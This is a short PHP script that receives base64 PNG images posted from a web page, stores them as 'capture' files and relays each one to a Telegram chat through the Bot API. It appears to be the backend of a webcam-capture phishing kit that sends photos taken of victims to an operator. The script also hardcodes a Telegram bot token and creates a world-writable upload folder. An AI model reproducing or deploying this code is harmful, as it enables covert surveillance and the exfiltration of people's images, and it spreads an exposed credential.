<?php
$botToken = "7525794586:AAH9YlfXazDX1zzx1ss23q8RuIqyMJcVzZI";
$uploadDir = __DIR__ . '/uploads/';
if (!file_exists($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

$uid = isset($_GET['uid']) ? preg_replace('/[^0-9]/', '', $_GET['uid']) : 'unknown';

if (isset($_POST['cat'])) {
    $data = $_POST['cat'];
    if (preg_match('/^data:image\/png;base64,/', $data)) {
        $data = substr($data, strpos($data, ',') + 1);
        $data = base64_decode($data);

        if ($data !== false) {
            $filename = 'capture_' . $uid . '_' . time() . '.png';
            $filepath = $uploadDir . $filename;
            file_put_contents($filepath, $data);

            // Kirim balik ke user Telegram
            $url = "https://api.telegram.org/bot$botToken/sendPhoto";
            $post = [
                'chat_id' => $uid,
                'photo' => new CURLFile($filepath)
            ];
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $post
            ]);
            curl_exec($ch);
            curl_close($ch);

            echo json_encode(['status' => 'success']);
            exit;
        }
    }
}
echo json_encode(['status' => 'error']);
